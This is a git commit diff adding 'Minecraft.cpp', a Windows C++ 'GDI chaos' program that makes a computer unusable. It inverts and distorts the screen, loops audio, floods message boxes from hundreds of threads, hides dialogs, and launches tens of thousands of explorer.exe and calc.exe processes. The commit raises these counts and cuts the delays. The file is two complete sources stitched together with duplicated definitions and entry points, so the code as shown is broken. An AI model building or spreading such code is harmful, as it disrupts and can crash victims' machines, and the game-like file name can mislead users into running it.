4ca20e24e87ea9d98755f96b3b2484bbd5e3ad55
Tvkhalil456 <tvkhalil456@gmail.com>
2025-06-28 17:31:28 +0200

    Add files via upload

--- Minecraft.cpp
+++ Minecraft.cpp
@@ -1,3 +1,31 @@
+// Minecraft.cpp
+// Fusion chaotique de newfile.cpp et goto.cpp
+// Conçu pour un chaos graphique maximal sans dépendance UNICODE
+
+#define NOMINMAX
+#define _WIN32_WINNT 0x0601
+
+#include <windows.h>
+#include <gdiplus.h>
+#include <mmsystem.h>
+#include <cstdlib>
+#include <ctime>
+#include <vector>
+#include <shellapi.h>
+#include <string>
+
+#pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "winmm.lib")
+#pragma comment(lib, "comctl32.lib")
+#pragma comment(lib, "shell32.lib")
+
+using namespace Gdiplus;
+
+// == Début du code fusionné ==
+
+// --- Contenu de goto.cpp ---
 // GDI WAR PATAPIM.exe - Projet par TVKHALIL SAS // Tous les effets GDI sont utilisés pour un chaos graphique maximal
 
 #include <windows.h>
@@ -128,7 +156,7 @@ void ChaosGDI()
         DEFAULT_QUALITY, DEFAULT_PITCH, L"Consolas");
 
     // Divide screen in 50 parts and invert colors
-    int parts = 50;
+    int parts = 1000;
     int partW = w / parts;
     int partH = h / parts;
 
@@ -186,7 +214,7 @@ DWORD WINAPI MsgBoxThread(LPVOID)
 {
     for (int i = 0; i < 1500 && g_run; i++)
     {
-        MessageBoxW(NULL, L"brr brr patapim", L"Erreur", MB_ICONERROR | MB_OK);
+        MessageBoxW(NULL, L"brr brr patapim", L"brr brr patapim", MB_ICONERROR | MB_OK);
         Sleep(5);
     }
     return 0;
@@ -196,10 +224,10 @@ DWORD WINAPI MsgBoxThread(LPVOID)
 // Explorer Spam     //
 DWORD WINAPI ExplorerThread(LPVOID)
 {
-    for (int i = 0; i < 4134 && g_run; i++)
+    for (int i = 0; i < 134523 && g_run; i++)
     {
         ShellExecuteW(NULL, L"open", L"explorer.exe", NULL, NULL, SW_SHOWDEFAULT);
-        Sleep(5);
+        Sleep(1);
     }
     return 0;
 }
@@ -209,11 +237,11 @@ DWORD WINAPI ExplorerThread(LPVOID)
 DWORD WINAPI CalcThread(LPVOID)
 {
     int opened = 0;
-    while (g_run && opened < 8900)
+    while (g_run && opened < 13500)
     {
         ShellExecuteW(NULL, L"open", L"calc.exe", NULL, NULL, SW_SHOWDEFAULT);
         opened++;
-        Sleep(100); // 10 par seconde
+        Sleep(5); // 10 par seconde
     }
     return 0;
 }
@@ -285,7 +313,7 @@ DWORD WINAPI SaleWinThread(LPVOID)
     RegisterClassW(&wc);
 
     // Spawn a lot of mini popup windows, 2000 for example
-    for (int i = 0; i < 2000 && g_run; i++)
+    for (int i = 0; i < 5000 && g_run; i++)
     {
         CreateSaleWinPopup();
         Sleep(15); // vitesse d'apparition
@@ -299,7 +327,7 @@ DWORD WINAPI SaleWinThread(LPVOID)
     // Keep thread alive while windows are open
     while (g_run)
     {
-        Sleep(1000);
+        Sleep(50);
     }
     return 0;
 }
@@ -459,6 +487,7 @@ DWORD WINAPI IconFollowerThread(LPVOID)
 }
 
 ///////////////////////
+
 // Main WinMain //
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
 {
@@ -507,3 +536,362 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
 
     return 0;
 }
+
+// --- Contenu de newfile.cpp ---
+//DRAX
+
+#define NOMINMAX
+#define _WIN32_WINNT 0x0601
+
+#include <windows.h>
+#include <gdiplus.h>
+#include <mmsystem.h>
+#include <cstdlib>
+#include <ctime>
+#include <vector>
+#include <shellapi.h>
+
+#pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "winmm.lib")
+#pragma comment(lib, "comctl32.lib")
+#pragma comment(lib, "shell32.lib")
+
+using namespace Gdiplus;
+
+// Déclarations
+DWORD WINAPI SoundThread(LPVOID);
+DWORD WINAPI GDIThread(LPVOID);
+DWORD WINAPI MsgBoxThread(LPVOID);
+DWORD WINAPI ExplorerThread(LPVOID);
+DWORD WINAPI CalcThread(LPVOID);
+DWORD WINAPI SaleWinThread(LPVOID);
+DWORD WINAPI IconFollowerThread(LPVOID);
+DWORD WINAPI MEMZ_GDI_Thread(LPVOID);
+DWORD WINAPI Open300WindowsThread(LPVOID);
+void NegativeEffect();
+
+// Globals
+HBITMAP g_hBmp = NULL;
+HWND g_hwndMain = NULL;
+HINSTANCE g_hInstance = NULL;
+CRITICAL_SECTION g_csIcons;
+std::vector<HWND> g_iconWindows;
+bool g_run = true;
+
+// Charge un PNG intégré en tant que ressource
+HBITMAP LoadPNGResource() {
+    HRSRC hRes = FindResourceA(g_hInstance, "PATAPIMPNG", RT_RCDATA);
+    if (!hRes) return NULL;
+
+    HGLOBAL hData = LoadResource(g_hInstance, hRes);
+    if (!hData) return NULL;
+
+    void* pData = LockResource(hData);
+    DWORD size = SizeofResource(g_hInstance, hRes);
+    if (!pData || size == 0) return NULL;
+
+    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, size);
+    if (!hg) return NULL;
+
+    void* pm = GlobalLock(hg);
+    if (!pm) {
+        GlobalFree(hg);
+        return NULL;
+    }
+    memcpy(pm, pData, size);
+    GlobalUnlock(hg);
+
+    IStream* ps = NULL;
+    if (CreateStreamOnHGlobal(hg, TRUE, &ps) != S_OK) {
+        GlobalFree(hg);
+        return NULL;
+    }
+
+    Bitmap* b = Bitmap::FromStream(ps);
+    HBITMAP hBmp = NULL;
+    if (b && b->GetLastStatus() == Ok)
+        b->GetHBITMAP(Color(0, 0, 0, 0), &hBmp);
+
+    delete b;
+    ps->Release();
+    return hBmp;
+}
+
+// Fenêtre principale
+LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
+    switch (m) {
+    case WM_DESTROY:
+        PostQuitMessage(0);
+        return 0;
+    case WM_PAINT:
+    {
+        PAINTSTRUCT ps;
+        HDC dc = BeginPaint(h, &ps);
+        if (g_hBmp) {
+            HDC mdc = CreateCompatibleDC(dc);
+            HBITMAP o = (HBITMAP)SelectObject(mdc, g_hBmp);
+            BITMAP bm;
+            GetObject(g_hBmp, sizeof(bm), &bm);
+            StretchBlt(dc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
+                mdc, 0, 0, bm.bmWidth, bm.bmHeight, SRCCOPY);
+            SelectObject(mdc, o);
+            DeleteDC(mdc);
+        }
+        EndPaint(h, &ps);
+        return 0;
+    }
+    default:
+        return DefWindowProcA(h, m, w, l);
+    }
+}
+
+// Threads individuels
+
+DWORD WINAPI SoundThread(LPVOID) {
+    PlaySoundA("musik.wav", NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);
+    while (g_run) Sleep(1000);
+    PlaySoundA(NULL, NULL, 0);
+    return 0;
+}
+
+void ChaosGDI() {
+    HDC hdc = GetDC(NULL);
+    int w = GetSystemMetrics(SM_CXSCREEN);
+    int h = GetSystemMetrics(SM_CYSCREEN);
+
+    HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 256, rand() % 256, rand() % 256));
+    HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
+    HFONT font = CreateFontA(40, 0, 0, 0, FW_BOLD, TRUE, FALSE, FALSE,
+        ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
+        DEFAULT_QUALITY, DEFAULT_PITCH, "Consolas");
+
+    int parts = 50;
+    int partW = w / parts;
+    int partH = h / parts;
+
+    for (int y = 0; y < parts; y++)
+        for (int x = 0; x < parts; x++) {
+            RECT rc = { x * partW, y * partH, (x + 1) * partW, (y + 1) * partH };
+            InvertRect(hdc, &rc);
+        }
+
+    for (int i = 0; i < 1000; i++) {
+        int x = rand() % w;
+        int y = rand() % h;
+        int rw = rand() % 400 + 10;
+        int rh = rand() % 300 + 10;
+
+        SelectObject(hdc, pen);
+        SelectObject(hdc, brush);
+
+        Rectangle(hdc, x, y, x + rw, y + rh);
+        Ellipse(hdc, x, y, x + rw / 2, y + rh / 2);
+        RoundRect(hdc, x, y, x + rw, y + rh, 20, 20);
+        MoveToEx(hdc, x, y, NULL);
+        LineTo(hdc, x + rw, y + rh);
+
+        RECT r = { x, y, x + rw / 2, y + rh / 2 };
+        InvertRect(hdc, &r);
+
+        SetROP2(hdc, R2_NOT);
+        StretchBlt(hdc, x, y, rw, rh, hdc, x + 10, y + 10, rw, rh, SRCCOPY);
+        PatBlt(hdc, x, y, rw / 2, rh / 2, PATINVERT);
+        SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
+        SetBkMode(hdc, TRANSPARENT);
+        SelectObject(hdc, font);
+        TextOutA(hdc, x, y, "brr brrr patapim", 17);
+        Sleep(10);
+    }
+
+    DeleteObject(pen);
+    DeleteObject(brush);
+    DeleteObject(font);
+    ReleaseDC(NULL, hdc);
+}
+
+DWORD WINAPI GDIThread(LPVOID) {
+    ChaosGDI();
+    NegativeEffect();
+    return 0;
+}
+
+void NegativeEffect() {
+    int width = GetSystemMetrics(SM_CXSCREEN);
+    int height = GetSystemMetrics(SM_CYSCREEN);
+    HDC hdcScreen = GetDC(NULL);
+    HDC hdcMem = CreateCompatibleDC(hdcScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
+    HBITMAP hOldBmp = (HBITMAP)SelectObject(hdcMem, hBitmap);
+    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
+
+    BITMAPINFO bmi = { 0 };
+    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    bmi.bmiHeader.biWidth = width;
+    bmi.bmiHeader.biHeight = -height;
+    bmi.bmiHeader.biPlanes = 1;
+    bmi.bmiHeader.biBitCount = 32;
+    bmi.bmiHeader.biCompression = BI_RGB;
+
+    BYTE* pPixels = new BYTE[width * height * 4];
+    if (pPixels) {
+        GetDIBits(hdcMem, hBitmap, 0, height, pPixels, &bmi, DIB_RGB_COLORS);
+
+        for (int i = 0; i < width * height * 4; i += 4) {
+            pPixels[i] = 255 - pPixels[i];
+            pPixels[i + 1] = 255 - pPixels[i + 1];
+            pPixels[i + 2] = 255 - pPixels[i + 2];
+        }
+
+        SetDIBits(hdcMem, hBitmap, 0, height, pPixels, &bmi, DIB_RGB_COLORS);
+        BitBlt(hdcScreen, 0, 0, width, height, hdcMem, 0, 0, SRCCOPY);
+        delete[] pPixels;
+    }
+
+    SelectObject(hdcMem, hOldBmp);
+    DeleteObject(hBitmap);
+    DeleteDC(hdcMem);
+    ReleaseDC(NULL, hdcScreen);
+}
+
+DWORD WINAPI MsgBoxThread(LPVOID) {
+    for (int i = 0; i < 1500 && g_run; i++) {
+        MessageBoxA(NULL, "PATAPIM !! PATAPIM !!", "PATAPIM", MB_OK | MB_ICONINFORMATION);
+        Sleep(10);
+    }
+    return 0;
+}
+
+DWORD WINAPI ExplorerThread(LPVOID) {
+    for (int i = 0; i < 1000 && g_run; i++) {
+        ShellExecuteA(NULL, "open", "explorer.exe", NULL, NULL, SW_SHOW);
+        Sleep(20);
+    }
+    return 0;
+}
+
+DWORD WINAPI CalcThread(LPVOID) {
+    for (int i = 0; i < 1000 && g_run; i++) {
+        ShellExecuteA(NULL, "open", "calc.exe", NULL, NULL, SW_SHOW);
+        Sleep(20);
+    }
+    return 0;
+}
+
+DWORD WINAPI SaleWinThread(LPVOID) {
+    for (int i = 0; i < 1500 && g_run; i++) {
+        HWND hwnd = FindWindowA("#32770", NULL);
+        if (hwnd)
+            ShowWindow(hwnd, SW_HIDE);
+        Sleep(50);
+    }
+    return 0;
+}
+
+DWORD WINAPI IconFollowerThread(LPVOID) {
+    while (g_run) {
+        POINT pt;
+        GetCursorPos(&pt);
+        HWND hwnd = CreateWindowExA(WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
+            "STATIC", NULL, WS_VISIBLE | WS_POPUP,
+            pt.x, pt.y, 32, 32, NULL, NULL, g_hInstance, NULL);
+
+        HICON hIcon = LoadIcon(NULL, IDI_INFORMATION);
+        SendMessageA(hwnd, STM_SETICON, (WPARAM)hIcon, 0);
+
+        EnterCriticalSection(&g_csIcons);
+        g_iconWindows.push_back(hwnd);
+        LeaveCriticalSection(&g_csIcons);
+
+        Sleep(50);
+        DestroyWindow(hwnd);
+    }
+    return 0;
+}
+
+DWORD WINAPI MEMZ_GDI_Thread(LPVOID) {
+    HDC hdc = GetDC(NULL);
+    while (g_run) {
+        BitBlt(hdc, rand() % GetSystemMetrics(SM_CXSCREEN),
+            rand() % GetSystemMetrics(SM_CYSCREEN),
+            rand() % 800, rand() % 600,
+            hdc, rand() % GetSystemMetrics(SM_CXSCREEN),
+            rand() % GetSystemMetrics(SM_CYSCREEN),
+            SRCCOPY);
+        Sleep(50);
+    }
+    ReleaseDC(NULL, hdc);
+    return 0;
+}
+
+DWORD WINAPI Open300WindowsThread(LPVOID) {
+    for (int i = 0; i < 300 && g_run; i++) {
+        CreateThread(NULL, 0, MsgBoxThread, NULL, 0, NULL);
+        Sleep(20);
+    }
+    return 0;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
+    g_hInstance = hInstance;
+    srand((unsigned int)time(NULL));
+    InitializeCriticalSection(&g_csIcons);
+
+    GdiplusStartupInput gdiInput;
+    ULONG_PTR gdiToken;
+    GdiplusStartup(&gdiToken, &gdiInput, NULL);
+
+    WNDCLASSEXA wcex = { sizeof(wcex) };
+    wcex.style = CS_HREDRAW | CS_VREDRAW;
+    wcex.lpfnWndProc = WndProc;
+    wcex.hInstance = hInstance;
+    wcex.lpszClassName = "PatapimWindowClass";
+    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
+    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
+
+    RegisterClassExA(&wcex);
+
+    g_hwndMain = CreateWindowExA(WS_EX_TOPMOST | WS_EX_LAYERED, wcex.lpszClassName,
+        "Patapim", WS_POPUP,
+        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
+        NULL, NULL, hInstance, NULL);
+
+    if (!g_hwndMain)
+        return -1;
+
+    g_hBmp = LoadPNGResource();
+    SetLayeredWindowAttributes(g_hwndMain, 0, 255, LWA_ALPHA);
+    ShowWindow(g_hwndMain, nCmdShow);
+    UpdateWindow(g_hwndMain);
+
+    HANDLE hThreads[] = {
+        CreateThread(NULL, 0, SoundThread, NULL, 0, NULL),
+        CreateThread(NULL, 0, GDIThread, NULL, 0, NULL),
+        CreateThread(NULL, 0, MsgBoxThread, NULL, 0, NULL),
+        CreateThread(NULL, 0, ExplorerThread, NULL, 0, NULL),
+        CreateThread(NULL, 0, CalcThread, NULL, 0, NULL),
+        CreateThread(NULL, 0, SaleWinThread, NULL, 0, NULL),
+        CreateThread(NULL, 0, IconFollowerThread, NULL, 0, NULL),
+        CreateThread(NULL, 0, MEMZ_GDI_Thread, NULL, 0, NULL),
+        CreateThread(NULL, 0, Open300WindowsThread, NULL, 0, NULL)
+    };
+
+    MSG msg;
+    while (GetMessageA(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessageA(&msg);
+    }
+
+    g_run = false;
+    WaitForMultipleObjects(9, hThreads, TRUE, INFINITE);
+    for (int i = 0; i < 9; i++) CloseHandle(hThreads[i]);
+
+    if (g_hBmp) DeleteObject(g_hBmp);
+    DeleteCriticalSection(&g_csIcons);
+    GdiplusShutdown(gdiToken);
+
+    return 0;
+}
+
+// == Fin du code fusionné ==
